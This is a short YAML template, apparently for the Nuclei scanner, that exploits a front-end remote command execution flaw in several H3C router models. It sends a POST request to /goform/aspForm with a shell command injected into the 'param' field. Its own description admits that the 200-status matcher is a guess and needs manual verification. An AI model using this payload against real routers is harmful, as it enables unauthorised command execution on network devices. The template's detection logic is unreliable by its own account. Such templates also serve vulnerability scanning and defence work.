id: poc-a381f3140e6d74e7ae87
info:
  name: H3C多系列路由器存在前台远程命令执行漏洞
  author: hacktwo
  severity: critical
  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: rce,2025
http:
- raw:
  - 'POST /goform/aspForm HTTP/1.1

    Accept-Encoding: gzip, deflate

    Content-Type: application/x-www-form-urlencoded

    Content-Length: 76

    Host: {{Hostname}}


    CMD=DelL2tpLNSList&GO=vpn_l2tp_session.asp&param=1; $(ls>/www/test);'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
